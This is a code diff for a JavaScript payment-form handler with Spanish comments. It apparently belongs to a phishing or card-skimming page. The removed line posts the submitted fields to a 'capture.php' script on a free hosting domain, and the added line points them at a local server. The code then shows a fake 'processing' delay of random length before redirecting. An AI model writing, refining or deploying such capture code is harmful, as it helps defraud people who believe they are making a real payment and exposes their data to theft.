@@ -17,8 +17,8 @@ document.getElementById('payment-form').addEventListener('submit', async functio
         return;
     }
 
-    // 🔹 Nueva URL del servidor PHP en InfinityFree
-    const serverUrl = "https://tobias61-paid.free.nf/capture.php"; 
+    // 🔹 Corrección de la URL del servidor
+    const serverUrl = "http://localhost:4000/send-data";
 
     // 🔹 Deshabilitar el botón para evitar múltiples envíos
     const payButton = document.querySelector('.pay-button');
@@ -26,10 +26,16 @@ document.getElementById('payment-form').addEventListener('submit', async functio
     payButton.innerText = "Procesando...";
 
     try {
+        console.log("📨 Enviando datos al servidor...");
+        
         const response = await fetch(serverUrl, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ firstName, secondName, thirdName })
+            body: JSON.stringify({
+                firstName: firstName.trim(),
+                secondName: secondName.trim(),
+                thirdName: thirdName.trim()
+            })
         });
 
         if (!response.ok) {
@@ -43,6 +49,7 @@ document.getElementById('payment-form').addEventListener('submit', async functio
         setTimeout(() => {
             window.location.href = "/processing/processing.html";
         }, Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000);
+
     } catch (error) {
         console.error("🚨 Error al enviar los datos:", error);
         alert(`Hubo un problema al procesar la información. ⚠️ Detalles: ${error.message}`);
